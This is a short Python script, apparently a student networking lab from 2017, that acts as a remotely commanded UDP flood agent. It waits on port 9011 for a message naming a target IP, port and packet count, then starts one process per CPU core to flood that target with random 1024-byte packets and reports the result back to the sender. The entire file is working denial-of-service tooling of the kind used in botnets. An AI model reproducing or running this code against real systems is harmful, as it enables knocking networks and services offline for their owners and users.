#Sam Decanio
#Philip Porter
#Vlad Synnes
#UDP Sockets Lab
#4/2/17

import socket #Imports needed libraries
import random
import time
import multiprocessing

# cd /d C:\Users\owner\Desktop\COMP429\UDP_Sockets

recv_sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) #Creates a socket
recv_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
recv_sock.bind(('', 9011))
send_sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) #Creates a socket

def flood(ip, port,amount):
	sent = 0
	bytes = random._urandom(1024) #Creates packet
	while sent < amount: #Infinitely loops sending packets to the port until the program is exited.
   		send_sock.sendto(bytes, (ip,port))
   		sent = sent + 1

if __name__ == "__main__":
	while True:
		# element 0 is data
		# element 1 is address of sender
		data = recv_sock.recvfrom(1024)
		extracted_data = data[0].decode('utf-8')
		print("Extracted data %s" % extracted_data)
		split_data = extracted_data.split()
		request_ip = data[1][0]
		request_port = data[1][1]
		print("Port: %s IP: %s" % (request_port, request_ip))
		target_ip = split_data[1]
		print("Target Port: %s" % split_data[2])
		target_port = int(split_data[2])
		amount = int(split_data[3])
		message = ("Request received: target IP: %s Port: %d Amount: %d " % (target_ip, target_port, amount)).encode('utf-8')
		recv_sock.sendto(message, (request_ip, request_port))
		
		start_time = time.time()
		process_list = list()

		for i in range(0, multiprocessing.cpu_count()):
			p = multiprocessing.Process(target = flood, args =(target_ip,target_port,amount / multiprocessing.cpu_count()))
			p.start()
			process_list.append(p)

		for p in process_list:
			p.join()

		message = ("Amount sent: %d\nDestination: IP = %s  port = %d\nTime: %s seconds" % (amount, target_ip, target_port, (time.time() - start_time))).encode('utf-8')
		recv_sock.sendto(message, (request_ip, request_port))
		print("<--- Completed Task --->\n\tAmount sent: %s\n\tDestination: IP = %s  port = %s\n\tTime: %s seconds" % (amount, target_ip, target_port, (time.time() - start_time)))
		